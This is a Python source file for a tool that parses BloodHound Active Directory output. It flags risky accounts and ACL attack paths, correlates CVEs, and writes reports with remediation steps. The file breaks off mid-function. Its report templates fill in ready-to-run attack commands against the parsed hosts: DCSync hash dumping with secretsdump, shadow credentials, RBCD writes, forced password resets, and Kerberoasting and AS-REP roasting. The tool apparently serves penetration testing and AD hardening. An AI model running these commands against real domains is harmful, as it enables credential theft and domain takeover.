"""
BloodHound Active Directory Analyzer
Detects and analyzes pasted BloodHound output (JSON, ZIP, Cypher queries, paths)
"""
import re
import json
import zipfile
import io
from pathlib import Path
from typing import Dict, List, Optional, Tuple, Any
from collections import defaultdict


class BloodHoundAnalyzer:
    """Detects and analyzes BloodHound Active Directory reconnaissance output"""

    # Well-known SIDs
    WELL_KNOWN_SIDS = {
        'S-1-1-0': 'Everyone',
        'S-1-5-7': 'Anonymous',
        'S-1-5-11': 'Authenticated Users',
        'S-1-5-32-544': 'Administrators',
        'S-1-5-32-545': 'Users',
        'S-1-5-32-546': 'Guests',
        'S-1-5-32-547': 'Power Users',
        'S-1-5-32-548': 'Account Operators',
        'S-1-5-32-549': 'Server Operators',
        'S-1-5-32-550': 'Print Operators',
        'S-1-5-32-551': 'Backup Operators',
        'S-1-5-32-552': 'Replicators',
        'S-1-5-32-554': 'Builtin\\Pre-Windows 2000 Compatible Access',
        'S-1-5-32-555': 'Builtin\\Remote Desktop Users',
        'S-1-5-32-556': 'Builtin\\Network Configuration Operators',
        'S-1-5-32-557': 'Builtin\\Incoming Forest Trust Builders',
        'S-1-5-32-558': 'Builtin\\Performance Monitor Users',
        'S-1-5-32-559': 'Builtin\\Performance Log Users',
        'S-1-5-32-560': 'Builtin\\Windows Authorization Access Group',
        'S-1-5-32-561': 'Builtin\\Terminal Server License Servers',
        'S-1-5-32-562': 'Builtin\\Distributed COM Users',
    }

    # Critical attack paths - ENHANCED with ADCS, GPO, LAPS, RBCD patterns
    ATTACK_PATHS = {
        'adminto': 'Local Administrator Access',
        'memberof': 'Group Membership',
        'hasession': 'Active User Sessions',
        'admincount': 'Protected Admin Account',
        'dcsync': 'DCSync Rights (Domain Replication)',
        'writedacl': 'Write DACL (Modify Permissions)',
        'writeowner': 'Write Owner (Take Ownership)',
        'genericall': 'GenericAll (Full Control)',
        'genericwrite': 'GenericWrite (Modify Attributes)',
        'forcechangepassword': 'Force Change Password',
        'addkeycredentiallink': 'Shadow Credentials Attack',
        'allextendedrights': 'All Extended Rights',
        'owns': 'Ownership',
        'contains': 'Container Relationship',
        'trustedby': 'Trust Relationship',
        'allowedtodelegate': 'Unconstrained Delegation',
        'allowedtoact': 'Resource-Based Constrained Delegation (RBCD)',
        'canrdp': 'RDP Access',
        'canpsremote': 'PowerShell Remoting',
        'executedcom': 'DCOM Execution',
        'allowedtoauthenticate': 'Allowed to Authenticate',
        'adcsesc1': 'ESC1 - Certificate Request Agent Template',
        'adcsesc2': 'ESC2 - Any Purpose Enhanced Key Usage',
        'adcsesc3': 'ESC3 - Certificate Enrollment Agent',
        'adcsesc4': 'ESC4 - Vulnerable Certificate Template ACL',
        'adcsesc5': 'ESC5 - Vulnerable PKI Object ACL',
        'adcsesc6': 'ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2 Flag',
        'adcsesc7': 'ESC7 - Vulnerable Certificate Authority ACL',
        'adcsesc8': 'ESC8 - NTLM Relay to AD CS HTTP Endpoints',
        'sqladmin': 'SQL Admin Access',
        'readlapspassword': 'Read LAPS Password',
        'readgmsapassword': 'Read gMSA Password',
        'getchanges': 'GetChanges (DCSync Part 1)',
        'getchangesall': 'GetChangesAll (DCSync Part 2)',
        'gplink': 'Group Policy Link',
        'writepropertyuser': 'Write Property on User',
        'writepropertycomputer': 'Write Property on Computer',
        'writepropertygroup': 'Write Property on Group',
        'writepropertyallowedtoact': 'Write msDS-AllowedToActOnBehalfOfOtherIdentity (RBCD)',
        'enrollonbehalfof': 'ESC1 - Enroll On Behalf Of',
        'webenroll': 'ESC8 - Web Enrollment Enabled',
        'dnsadmins': 'DNS Admins Group Membership',
        'backupoperators': 'Backup Operators Group Membership',
        'printoperators': 'Print Operators Group Membership',
    }

    # AD Technique to CVE Mapping - Links AD attacks to known CVEs
    AD_TECHNIQUE_TO_CVE = {
        'zerologon': {
            'cves': ['CVE-2020-1472'],
            'description': 'Netlogon privilege escalation - instant Domain Admin',
            'references': ['https://github.com/dirkjanm/CVE-2020-1472', 'https://www.secura.com/blog/zero-logon']
        },
        'printnightmare': {
            'cves': ['CVE-2021-34527', 'CVE-2021-1675'],
            'description': 'Print Spooler RCE - remote code execution as SYSTEM',
            'references': ['https://github.com/cube0x0/CVE-2021-1675']
        },
        'petitpotam': {
            'cves': ['CVE-2021-36942'],
            'description': 'EFSRPC authentication coercion for NTLM relay',
            'references': ['https://github.com/topotam/PetitPotam']
        },
        'nopac': {
            'cves': ['CVE-2021-42278', 'CVE-2021-42287'],
            'description': 'SAM name spoofing - impersonate Domain Controller',
            'references': ['https://github.com/Ridter/noPac']
        },
        'ms14-068': {
            'cves': ['CVE-2014-6324'],
            'description': 'Kerberos PAC validation bypass - forge admin tickets',
            'references': ['https://github.com/bidord/pykek']
        },
        'samaccountname_spoofing': {
            'cves': ['CVE-2021-42278', 'CVE-2021-42287'],
            'description': 'noPac attack - SAM name spoofing to DC',
            'references': ['https://github.com/Ridter/noPac']
        }
    }

    # High-value targets
    HIGH_VALUE_TARGETS = {
        'domain admins': 'Domain Administrators Group',
        'enterprise admins': 'Enterprise Administrators Group',
        'administrators': 'Local Administrators Group',
        'domain controllers': 'Domain Controllers',
        'backup operators': 'Backup Operators Group',
        'account operators': 'Account Operators Group',
        'server operators': 'Server Operators Group',
        'print operators': 'Print Operators Group',
        'dns admins': 'DNS Administrators Group',
        'schema admins': 'Schema Administrators Group',
        'krbtgt': 'Kerberos Ticket Granting Account',
        'administrator': 'Built-in Administrator Account',
        'exchange': 'Exchange Server/Admins',
        'mssql': 'SQL Server',
    }

    # Context cache for storing IP addresses and domain info
    _context_cache = {
        'computers': {},  # Maps computer names to IPs
        'domain': None,   # Domain name
        'dc_list': []     # List of domain controllers
    }

    @staticmethod
    def _extract_context_from_json(data: Dict):
        """Extract IP addresses, domain info, and DCs from BloodHound JSON"""
        BloodHoundAnalyzer._context_cache = {
            'computers': {},
            'domain': None,
            'dc_list': []
        }

        # Get objects
        objects = []
        if 'users' in data or 'computers' in data or 'groups' in data:
            objects.extend(data.get('computers', []))
            objects.extend(data.get('users', []))
            objects.extend(data.get('groups', []))
        elif 'data' in data:
            objects = data.get('data', [])

        # Extract computer IPs and identify DCs
        for obj in objects:
            props = obj.get('Properties', {})
            name = obj.get('Name', props.get('name', props.get('dnshostname', '')))

            if not name:
                continue

            # Extract domain from FQDN
            if '.' in name and not BloodHoundAnalyzer._context_cache['domain']:
                parts = name.split('.')
                if len(parts) > 1:
                    # Domain is everything after first part
                    BloodHoundAnalyzer._context_cache['domain'] = '.'.join(parts[1:])

            # Extract IP address (sometimes in operatingsystem field or custom properties)
            ip_addr = props.get('ipaddress', props.get('ip', None))
            if ip_addr:
                BloodHoundAnalyzer._context_cache['computers'][name.upper()] = ip_addr

            # Identify Domain Controllers
            if props.get('distinguishedname', '').startswith('CN=') and 'Domain Controllers' in props.get('distinguishedname', ''):
                BloodHoundAnalyzer._context_cache['dc_list'].append(name)

    @staticmethod
    def _get_target_address(target_name: str) -> str:
        """
        Get IP address or FQDN for target.
        Priority: IP from JSON > FQDN from target_name > placeholder
        """
        if not target_name:
            return "<TARGET>"

        # Check if we have an IP address in cache
        target_upper = target_name.upper().split('@')[0]
        if target_upper in BloodHoundAnalyzer._context_cache['computers']:
            return BloodHoundAnalyzer._context_cache['computers'][target_upper]

        # Return FQDN if it contains domain
        if '.' in target_name and not target_name.startswith('.'):
            return target_name.split('@')[0]

        # Try to construct FQDN using cached domain
        hostname = target_name.split('@')[0]
        if BloodHoundAnalyzer._context_cache['domain']:
            return f"{hostname}.{BloodHoundAnalyzer._context_cache['domain']}"

        # Fallback to hostname only
        return hostname

    @staticmethod
    def _extract_domain_from_name(name: str) -> str:
        """Extract domain from FQDN or use cached domain"""
        if '@' in name:
            return name.split('@')[1]
        elif '.' in name:
            parts = name.split('.')
            return '.'.join(parts[1:]) if len(parts) > 1 else name
        elif BloodHoundAnalyzer._context_cache['domain']:
            return BloodHoundAnalyzer._context_cache['domain']
        else:
            return "DOMAIN.LOCAL"

    @staticmethod
    def detect_bloodhound_output(text: str) -> bool:
        """
        Detect if text contains BloodHound output.
        Returns True if BloodHound output detected.
        """
        text_lower = text.lower()

        # Quick rejection checks
        if len(text) < 30:
            return False

        # CRITICAL: REJECT if this is a QUESTION (not output)
        # Only check the first line for question patterns (not inside JSON data)
        first_line = text.strip().split('\n')[0] if text.strip() else text
        question_patterns = [
            r'^\s*(what|how|why|when|where|who|which|can you|could you|please|show me|give me|explain|tell me|describe|outline|define|what is the impact of)',
            r'\?\s*$',  # Ends with question mark
            r'(what is|how do|how to|can i|should i|explain the|describe the|give me a step-by-step)',
        ]

        for pattern in question_patterns:
            if re.search(pattern, first_line, re.IGNORECASE):
                return False

        # REJECT if this looks like other tool outputs
        reject_patterns = [
            r'\d+\.\d+\.\d+\.\d+\s*→\s*\d+\.\d+\.\d+\.\d+',  # PCAP
            r'PID\s+PPID\s+ImageFileName',  # Volatility
            r'windows\.(pslist|netscan)',  # Volatility plugins
        ]

        for pattern in reject_patterns:
            if re.search(pattern, text, re.IGNORECASE):
                return False

        # BloodHound-specific indicators
        bloodhound_indicators = [
            # JSON structure with BloodHound keys
            r'"(nodes|edges|data|meta)":\s*[\[\{]',
            r'"ObjectIdentifier":\s*"S-1-5',  # Windows SID
            r'"HighValue":\s*(true|false)',
            r'"Properties":\s*{[^}]*"domain"', # Non-greedy match
            r'"Aces":\s*\[',
            r'"PrincipalSID"',
            r'"RightName"',

            # Cypher query syntax (using non-greedy .*?)
            r'MATCH\s+\(.*?\)RETURN',
            r'MATCH\s+p=.*?shortestPath',
            r'-\[\s*:(AdminTo|MemberOf|HasSession|Contains|Owns|GenericAll|WriteDacl|WriteOwner|ForceChangePassword|AddKeyCredentialLink)',

            # BloodHound path notation
            r'(User|Computer|Group|Domain|OU|GPO|Container)\s*-\[',
            r'\]->\s*(User|Computer|Group|Domain|OU|GPO)',

            # SharpHound collection output
            r'SharpHound|Bloodhound',
            r'Resolved Collection Methods',
            r'Building Cache|Running Cache|Finished Cache',
            r'Status:\s+\d+\s+(Users|Groups|Computers|Sessions|Trusts)',
        ]

        # Check for BloodHound-specific patterns
        confidence_score = 0
        for pattern in bloodhound_indicators:
            if re.search(pattern, text, re.MULTILINE | re.IGNORECASE):
                confidence_score += 1

        # Need at least 2 indicators for confidence
        if confidence_score >= 2:
            return True

        # Check for Active Directory terminology
        ad_terms = ['domain admin', 'domain controller', 'kerberos', 'ntlm', 'ldap',
                    'organizational unit', 'group policy', 'security identifier', 'sid']

        ad_term_count = sum(1 for term in ad_terms if term in text_lower)

        # If lots of AD terms + some path indicators, likely BloodHound
        if ad_term_count >= 3 and re.search(r'(->|path|shortest|attack)', text_lower):
            return True

        return False

    @staticmethod
    def _generate_report(vulnerabilities: Dict) -> str:
        """Generates a markdown report from a vulnerabilities dictionary - ENHANCED with CVE correlation."""
        findings = []
        attack_paths = vulnerabilities.get('attack_paths', [])
        property_vulns = vulnerabilities.get('property_vulns', [])
        high_value_targets = vulnerabilities.get('high_value_targets', [])
        computer_info = vulnerabilities.get('computer_info', [])

        findings.append("="*80)

        # PHASE 2: Enrich attack paths with AD CVE correlation
        attack_paths = BloodHoundAnalyzer._enrich_with_ad_cves(attack_paths)

        # PHASE 2: Query CVE database for Windows hosts
        windows_cves = BloodHoundAnalyzer._correlate_windows_cves(computer_info)

        # CRITICAL FIX: Store CVEs in vulnerabilities dict so fact extractor can use them
        vulnerabilities['cves'] = windows_cves

        # Sort attack paths by risk
        attack_paths_sorted = sorted(attack_paths, key=lambda x: {'CRITICAL': 0, 'HIGH': 1, 'MEDIUM': 2, 'LOW': 3}.get(x['risk'], 4))

        has_findings = bool(property_vulns or attack_paths or high_value_targets)

        # 1. Executive Summary - The most critical paths
        critical_paths = [p for p in attack_paths_sorted if p['risk'] == 'CRITICAL']
        if critical_paths:
            findings.append("## [!!!] EXECUTIVE SUMMARY: TOP ATTACK PATHS\n")
            findings.append("The following CRITICAL attack paths provide direct routes to compromise high-value targets.\n")
            for path in critical_paths[:5]: # Top 5 critical paths
                findings.append(f"**Path:** **{path['source']}** can compromise **{path['target']}**")
                findings.append(f"- **Via Permission:** `{path['relationship']}`")
                findings.append(f"- **Impact:** {path['impact']}")
                findings.append(f"- **Remediation:** Remove the permission `{path['relationship']}` for `{path['source']}` on `{path['target']}`.\n")

        findings.append("="*80)
        findings.append("## [*] DETAILED FINDINGS\n")

        # 2. High-value targets
        if high_value_targets:
            findings.append("### [TARGET] HIGH-VALUE TARGETS\n")
            unique_targets = {t['name']: t for t in high_value_targets}
            for target in list(unique_targets.values())[:10]:  # Top 10 unique
                findings.append(f"- **{target['name']}** ({target['type']})")
                if target.get('why'):
                    findings.append(f"  - {target['why']}")
            findings.append("")

        # 2.5. PHASE 2 - Windows Host CVE Correlation
        if windows_cves:
            findings.append("### [!] POTENTIAL VULNERABILITIES (CVE Database Correlation)\n")
            findings.append("**IMPORTANT:** BloodHound does NOT detect patch levels. These CVEs are relevant")
            findings.append("to the OS versions detected, but may already be patched. Validate with a vulnerability scanner.\n")
            findings.append("The following Windows hosts have CVEs matching their OS version:\n")

            for computer_name, cves in list(windows_cves.items())[:10]:  # Top 10 computers
                findings.append(f"\n**{computer_name}**")
                findings.append(f"- {len(cves)} CVE(s) found (showing top {min(len(cves), 5)})")

                for cve in cves:
                    findings.append(f"\n  **{cve['cve_id']}** (CVSS {cve['cvss']}) - {cve['severity']}")
                    findings.append(f"  - OS Version Match: {cve['confidence']}% (not validated - patch status unknown)")
                    findings.append(f"  - {cve['description']}")

                    if cve['has_exploit'] and cve['exploits']:
                        findings.append(f"  - **[HAS EXPLOIT]**")
                        for exploit in cve['exploits']:
                            findings.append(f"    - EDB-{exploit['edb_id']}: {exploit['title']}")
                            if exploit.get('is_remote'):
                                findings.append(f"      Type: REMOTE")

                findings.append("")

            if len(windows_cves) > 10:
                findings.append(f"... and {len(windows_cves) - 10} more computers with CVEs\n")

        # 3. All Attack paths from ACEs - ENHANCED with AD CVE correlation
        if attack_paths:
            findings.append("### ACL-BASED ATTACK PATHS\n")
            for path in attack_paths_sorted[:20]:  # Top 20
                findings.append(f"\n**[{path['risk']}] {path['source']} → {path['target']}**")
                findings.append(f"- Permission: **{path['relationship']}**")
                findings.append(f"- Description: {path['description']}")
                if path.get('exploit'):
                    findings.append(f"- **Exploit:** {path['exploit']}")
                if path.get('impact'):
                    findings.append(f"- **Impact:** {path['impact']}")

                # PHASE 2: Show AD CVE correlation if available
                if path.get('ad_cve_correlation'):
                    corr = path['ad_cve_correlation']
                    findings.append(f"\n  **[CVE CORRELATION]** {corr['description']}")
                    for cve_info in corr['cves']:
                        findings.append(f"  - {cve_info['cve_id']} [HAS EXPLOIT]")
                        for exploit in cve_info['exploits']:
                            findings.append(f"    - EDB-{exploit['edb_id']}: {exploit['title']}")

                findings.append("")

        # 4. Property-based vulnerabilities
        if property_vulns:
            findings.append("### PROPERTY-BASED VULNERABILITIES\n")
            vuln_groups = defaultdict(list)
            for vuln in property_vulns:
                vuln_groups[vuln['type']].append(vuln)

            for vuln_type, vulns in vuln_groups.items():
                findings.append(f"\n**{vuln_type}** ({len(vulns)} account(s)):")
                for vuln in vulns[:10]:  # Top 10 per type
                    findings.append(f"- **{vuln['account']}**")
                    if vuln.get('details'):
                        findings.append(f"  {vuln['details']}")
                    findings.append(f"  **Exploit:** {vuln['exploit']}")
                    findings.append(f"  **Fix:** {vuln['fix']}")
                    findings.append("")
                if len(vulns) > 10:
                    findings.append(f"  ... and {len(vulns) - 10} more\n")

        # 5. PHASE 1 - Multi-Step Attack Chain
        if has_findings and (property_vulns or attack_paths):
            findings.append("="*80)
            attack_chain = BloodHoundAnalyzer._generate_attack_chain(property_vulns, attack_paths)
            findings.append(attack_chain)

        if not has_findings:
            findings.append("## [OK] NO CRITICAL VULNERABILITIES FOUND\n")
            findings.append("No high-impact property or ACL-based vulnerabilities were automatically detected.\n")
            findings.append("This could mean:\n")
            findings.append("- A well-hardened Active Directory environment.\n")
            findings.append("- The supplied data was limited (e.g., from a filtered query).\n")
            findings.append("Manual review is still recommended.\n\n")

        # OFFENSIVE GUIDANCE, DEFENSIVE GUIDANCE, etc. would continue here...
        # (Keeping the rest of the report structure for brevity in this example)

        return "\n".join(findings)

    @staticmethod
    def analyze_bloodhound_output(text: str) -> Tuple[str, Optional[Dict]]:
        """
        Analyze BloodHound output and provide detailed recommendations.
        Returns a tuple of (report_string, vulnerabilities_dict).
        """
        findings = ["# [!] BLOODHOUND ACTIVE DIRECTORY ANALYSIS\n"]
        vulnerabilities = None

        # Try to parse as JSON first
        parsed_data = BloodHoundAnalyzer._try_parse_json(text)

        if parsed_data:
            output_type = "SharpHound JSON Export"
            findings.append(f"**Detected Output Type**: {output_type}\n")
            vulnerabilities = BloodHoundAnalyzer._analyze_json_data(parsed_data)
            report = BloodHoundAnalyzer._generate_report(vulnerabilities)
            findings.append(report)
        else:
            # Fallback for non-JSON or simple text
            output_type = BloodHoundAnalyzer._detect_output_type(text)
            findings.append(f"**Detected Output Type**: {output_type}\n")
            findings.append("Could not parse full JSON. Falling back to text-based analysis (results may be limited).\n")

        return "\n".join(findings), vulnerabilities
    
    @staticmethod
    def _try_parse_json(text: str) -> Optional[Dict]:
        """Try to parse text as JSON, return None if failed"""
        try:
            # Try direct JSON parse
            data = json.loads(text)
            # Accept old format (data/nodes) or new format (users/computers/groups)
            if isinstance(data, dict) and ('data' in data or 'nodes' in data or 'users' in data or 'computers' in data or 'groups' in data):
                return data
        except json.JSONDecodeError:
            pass

        # Try to extract JSON from text (old format pattern)
        json_pattern = r'\{[^\{\}]*"data"\s*:\s*\[[^\]]*\{[^\}]*"Properties"'
        match = re.search(json_pattern, text, re.DOTALL)
        if match:
            try:
                # Find the full JSON object
                start = text.find('{', match.start())
                brace_count = 0
                max_scan = min(start + 5_000_000, len(text))
                for i in range(start, max_scan):
                    if text[i] == '{':
                        brace_count += 1
                    elif text[i] == '}':
                        brace_count -= 1
                        if brace_count == 0:
                            json_str = text[start:i+1]
                            return json.loads(json_str)
            except (json.JSONDecodeError, ValueError):
                pass

        # Try to extract JSON from text (new format pattern with users/computers/groups)
        json_pattern_new = r'\{[^\{\}]*"(users|computers|groups)"\s*:\s*\['
        match = re.search(json_pattern_new, text, re.DOTALL)
        if match:
            try:
                # Find the full JSON object
                start = text.find('{', match.start())
                brace_count = 0
                max_scan = min(start + 5_000_000, len(text))
                for i in range(start, max_scan):
                    if text[i] == '{':
                        brace_count += 1
                    elif text[i] == '}':
                        brace_count -= 1
                        if brace_count == 0:
                            json_str = text[start:i+1]
                            return json.loads(json_str)
            except (json.JSONDecodeError, ValueError):
                pass

        return None

    @staticmethod
    def _analyze_json_data(data: Dict) -> Dict[str, List[Dict]]:
        """Analyze parsed JSON BloodHound data"""
        # FIRST: Extract context (IPs, domain, DCs) for enhanced exploit commands
        BloodHoundAnalyzer._extract_context_from_json(data)

        vulnerabilities = {
            'property_vulns': [],
            'attack_paths': [],
            'high_value_targets': [],
            'acl_issues': [],
            'computer_info': []  # For CVE correlation
        }

        # Build SID to name mapping
        sid_to_name = {}

        # Get data array - handle both old and new formats
        objects = []

        # New format: separate users/computers/groups arrays
        if 'users' in data or 'computers' in data or 'groups' in data:
            objects.extend(data.get('users', []))
            objects.extend(data.get('computers', []))
            objects.extend(data.get('groups', []))
        # Old format: single data array
        elif 'data' in data:
            objects = data.get('data', [])

        # First pass: build SID mapping
        for obj in objects:
            props = obj.get('Properties', {})
            # New format: Name at top level, Old format: ObjectIdentifier
            obj_id = obj.get('ObjectIdentifier', '')
            # Try Name at top level first (new format), then inside Properties (old format)
            name = obj.get('Name', props.get('name', props.get('samaccountname', '')))
            if obj_id and name:
                sid_to_name[obj_id] = name

        # CRITICAL FIX: Process "links" array if present (user's JSON format)
        if 'links' in data:
            for link in data['links']:
                source_sid = link.get('source', '')
                target_sid = link.get('target', '')
                relationship = link.get('relationship', link.get('label', ''))

                # Resolve SIDs to names
                source_name = BloodHoundAnalyzer._resolve_sid(source_sid, sid_to_name)
                target_name = BloodHoundAnalyzer._resolve_sid(target_sid, sid_to_name)

                if source_name and target_name and relationship:
                    # Assess risk and get exploitation details
                    risk, exploit, impact = BloodHoundAnalyzer._assess_ace_risk(relationship, source_name, target_name)

                    if risk != 'LOW':
                        vulnerabilities['attack_paths'].append({
                            'source': source_name,
                            'target': target_name,
                            'relationship': relationship,
                            'description': BloodHoundAnalyzer.ATTACK_PATHS.get(relationship.lower(), relationship),
                            'risk': risk,
                            'exploit': exploit,
                            'impact': impact
                        })

        # Second pass: analyze objects
        for obj in objects:
            props = obj.get('Properties', {})
            aces = obj.get('Aces', [])
            obj_id = obj.get('ObjectIdentifier', '')

            # Try Name at top level first (new format), then inside Properties (old format)
            name = obj.get('Name', props.get('name', props.get('samaccountname', '')))
            if not name:
                continue

            # Check for property-based vulnerabilities
            # Note: 'enabled' field may not exist in new format, default to True
            is_enabled = props.get('enabled', True)

            # 1. Kerberoastable - FIX: Check for serviceprincipalnames array OR hasspn flag
            spns = props.get('serviceprincipalnames', [])
            has_spn = props.get('hasspn', False) or (spns and len(spns) > 0)

            if has_spn and is_enabled:
                # Extract domain from name if available
                domain = name.split('@')[1] if '@' in name else 'DOMAIN.LOCAL'
                dc_ip = BloodHoundAnalyzer._context_cache.get('dc_list', ['DC_IP'])[0] if BloodHoundAnalyzer._context_cache.get('dc_list') else 'DC_IP'

                vulnerabilities['property_vulns'].append({
                    'type': 'KERBEROASTABLE',
                    'account': name,
                    'details': f"SPNs: {', '.join(spns[:3]) if spns else 'Set'}",
                    'exploit': f"GetUserSPNs.py {domain}/username:password -request -dc-ip {dc_ip}",
                    'fix': f"Set-ADUser {name.split('@')[0]} -ServicePrincipalNames @{{Remove='<SPN>'}}"
                })

            # 2. AS-REP Roasting
            if props.get('dontreqpreauth') and is_enabled:
                domain = name.split('@')[1] if '@' in name else 'DOMAIN.LOCAL'
                dc_ip = BloodHoundAnalyzer._context_cache.get('dc_list', ['DC_IP'])[0] if BloodHoundAnalyzer._context_cache.get('dc_list') else 'DC_IP'

                vulnerabilities['property_vulns'].append({
                    'type': 'AS-REP ROASTING',
                    'account': name,
                    'details': 'Pre-authentication not required',
                    'exploit': f"GetNPUsers.py {domain}/ -usersfile users.txt -no-pass -dc-ip {dc_ip}",
                    'fix': f"Set-ADAccountControl {name.split('@')[0]} -DoesNotRequirePreAuth $false"
                })

            # 3. Password Not Required
            if props.get('passwordnotreqd') and is_enabled:
                vulnerabilities['property_vulns'].append({
                    'type': 'PASSWORD NOT REQUIRED',
                    'account': name,
                    'details': 'CRITICAL: Account does not require password',
                    'exploit': f"crackmapexec smb DC -u {name.split('@')[0]} -p ''",
                    'fix': f"Set-ADUser {name.split('@')[0]} -PasswordNotRequired $false; Set-ADAccountPassword {name.split('@')[0]} -Reset"
                })

            # 4. Unconstrained Delegation
            if props.get('unconstraineddelegation') and is_enabled:
                vulnerabilities['property_vulns'].append({
                    'type': 'UNCONSTRAINED DELEGATION',
                    'account': name,
                    'details': 'Can impersonate any user',
                    'exploit': f"Rubeus.exe monitor /interval:5 /nowrap",
                    'fix': f"Set-ADComputer {name.split('@')[0]} -TrustedForDelegation $false"
                })

            # 4.5. Collect computer information for CVE correlation (Phase 2)
            if props.get('operatingsystem'):
                # This is a computer object - collect for CVE correlation
                os_name = props.get('operatingsystem', '')
                os_version = props.get('operatingsystemversion', '')

                if 'windows' in os_name.lower():
                    vulnerabilities['computer_info'].append({
                        'name': name,
                        'os': os_name,
                        'version': os_version,
                        'ip': BloodHoundAnalyzer._context_cache['computers'].get(name.upper(), None),
                        'is_dc': name in BloodHoundAnalyzer._context_cache['dc_list']
                    })

            # 5. High-value targets
            name_lower = name.lower()
            is_hvt = False
            if props.get('admincount'):
                vulnerabilities['high_value_targets'].append({
                    'name': name,
                    'type': 'AdminCount-Protected Account',
                    'why': 'This account is a member of a protected group (e.g., Domain Admins) and has special protections.'
                })
                is_hvt = True

            if not is_hvt:
                for hvt, desc in BloodHoundAnalyzer.HIGH_VALUE_TARGETS.items():
                    if hvt in name_lower:
                        vulnerabilities['high_value_targets'].append({
                            'name': name,
                            'type': desc,
                            'why': 'Matches high-value target name pattern.'
                        })
                        break

            # Analyze ACEs for attack paths
            for ace in aces:
                # New format: PrincipalName directly, Old format: PrincipalSID that needs resolving
                principal_name = ace.get('PrincipalName', '')
                if not principal_name:
                    # Old format - resolve SID to name
                    principal_sid = ace.get('PrincipalSID', '')
                    principal_name = BloodHoundAnalyzer._resolve_sid(principal_sid, sid_to_name)

                right_name = ace.get('RightName', '')

                # New format has TargetName in ACE, old format uses the object name
                target_name = ace.get('TargetName', name)

                # Determine risk and exploitation
                risk, exploit, impact = BloodHoundAnalyzer._assess_ace_risk(right_name, principal_name, target_name)

                if risk != 'LOW':
                    vulnerabilities['attack_paths'].append({
                        'source': principal_name,
                        'target': target_name,
                        'relationship': right_name,
                        'description': BloodHoundAnalyzer.ATTACK_PATHS.get(right_name.lower(), right_name),
                        'risk': risk,
                        'exploit': exploit,
                        'impact': impact
                    })

        return vulnerabilities

    @staticmethod
    def _resolve_sid(sid: str, sid_map: Dict[str, str]) -> str:
        """Resolve SID to name"""
        # Check well-known SIDs
        if sid in BloodHoundAnalyzer.WELL_KNOWN_SIDS:
            return BloodHoundAnalyzer.WELL_KNOWN_SIDS[sid]

        # Check domain-specific pattern (e.g., DOMAIN-S-1-5-32-544)
        if '-S-1-5-32-' in sid:
            base_sid = sid.split('-', 1)[1]  # Remove domain prefix
            if base_sid in BloodHoundAnalyzer.WELL_KNOWN_SIDS:
                return BloodHoundAnalyzer.WELL_KNOWN_SIDS[base_sid]

        # Check our mapping
        if sid in sid_map:
            return sid_map[sid]

        # Last resort: return SID
        return sid

    @staticmethod
    def _assess_ace_risk(right_name: str, principal: str, target: str) -> Tuple[str, str, str]:
        """Assess risk level and exploitation for an ACE - ENHANCED with real IPs/FQDNs"""
        right_lower = right_name.lower()
        principal_lower = principal.lower()
        target_lower = target.lower()

        is_hvt = any(hvt in target_lower for hvt in ['domain admins', 'enterprise admins', 'administrators', 'krbtgt'])
        is_domain_target = '.local' in target_lower or 'domain' in target_lower or target_lower.endswith('.com')

        # Extract clean names
        principal_name = principal.split('@')[0]
        target_name = target.split('@')[0]

        # Get actual target address (IP or FQDN from BloodHound data)
        target_addr = BloodHoundAnalyzer._get_target_address(target)
        domain = BloodHoundAnalyzer._extract_domain_from_name(target)

        # CRITICAL risks
        # DCSync detection - GetChanges or GetChangesAll on domain
        if right_lower in ['getchanges', 'getchangesall'] and is_domain_target:
            return ('CRITICAL',
                    f"secretsdump.py {domain}/{principal_name}:[PASSWORD]@{target_addr} -just-dc-ntlm",
                    f"DCSync attack - dump all domain password hashes including KRBTGT. Target: {target_addr}")

        if right_lower == 'addkeycredentiallink':
            return ('CRITICAL',
                    f"certipy shadow auto -target '{target_name}' -username '{principal_name}@{domain}' -password '[PASSWORD]'",
                    "Shadow Credentials attack - instant account takeover without password change")

        if right_lower in ['genericall', 'owns']:
            # Provide specific commands based on target type
            if '$' in target:  # Computer account
                exploit = f"rbcd.py -delegate-from '{principal_name}' -delegate-to '{target_name}' -dc-ip {target_addr} -action write '{domain}/{principal_name}:[PASSWORD]'"
            else:  # User account
                exploit = f"bloodyAD.py -d {domain} -u '{principal_name}' -p '[PASSWORD]' set password '{target_name}' 'NewPassword123!'"

            impact = f"Full control over {target} - can reset password, modify properties, grant permissions"
            if is_hvt and not any(admin_group in principal_lower for admin_group in ['domain admins', 'enterprise admins']):
                return 'CRITICAL', exploit, f"Direct path to Domain Admin by controlling {target}"
            return 'CRITICAL', exploit, impact

        if right_lower == 'writedacl':
            return ('CRITICAL',
                    f"dacledit.py -action write -rights FullControl -principal '{principal_name}' -target '{target_name}' -dc-ip {target_addr} '{domain}/{principal_name}:[PASSWORD]'",
                    "Can grant yourself any permission - then GenericAll for full control")

        if right_lower == 'writeowner':
            return ('CRITICAL',
                    f"owneredit.py -action write -new-owner '{principal_name}' -target '{target_name}' '{domain}/{principal_name}:[PASSWORD]' -dc-ip {target_addr}",
                    "Can become owner and then grant yourself full control")

        # HIGH risks
        if right_lower == 'allextendedrights':
            return ('HIGH',
                    f"bloodyAD.py -d {domain} -u '{principal_name}' -p '[PASSWORD]' set password '{target_name}' 'NewPassword123!'",
                    "Includes ForceChangePassword and other dangerous rights")

        if right_lower == 'forcechangepassword':
            return ('HIGH',
                    f"bloodyAD.py -d {domain} -u '{principal_name}' -p '[PASSWORD]' set password '{target_name}' 'NewPassword123!' --dc-ip {target_addr}",
                    f"Can reset {target}'s password - instant account takeover")

        if right_lower == 'genericwrite':
            # Check if target is a group (potential for member modification)
            if 'domain admins' in target_lower or 'administrators' in target_lower or any(grp in target_lower for grp in ['admins', 'operators']):
                return ('CRITICAL',
                        f"# GenericWrite on group - multiple attack vectors:\n# 1. Enable AS-REP Roasting (if target is user):\nbloodyAD.py -d {domain} -u '{principal_name}' -p '[PASSWORD]' add uac '{target_name}' -f DONT_REQ_PREAUTH --dc-ip {target_addr}\n# 2. Add SPN for Kerberoasting (if target is user):\nbloodyAD.py -d {domain} -u '{principal_name}' -p '[PASSWORD]' add servicePrincipalName '{target_name}' 'HTTP/fake' --dc-ip {target_addr}\n# NOTE: GenericWrite does NOT directly allow adding members to groups. That requires WriteMember or GenericAll.",
                        f"Can modify {target} attributes. Multiple exploitation paths possible. GenericWrite does NOT grant member modification rights.")
            else:
                return ('HIGH',
                        f"bloodyAD.py -d {domain} -u '{principal_name}' -p '[PASSWORD]' add uac '{target_name}' -f DONT_REQ_PREAUTH --dc-ip {target_addr}",
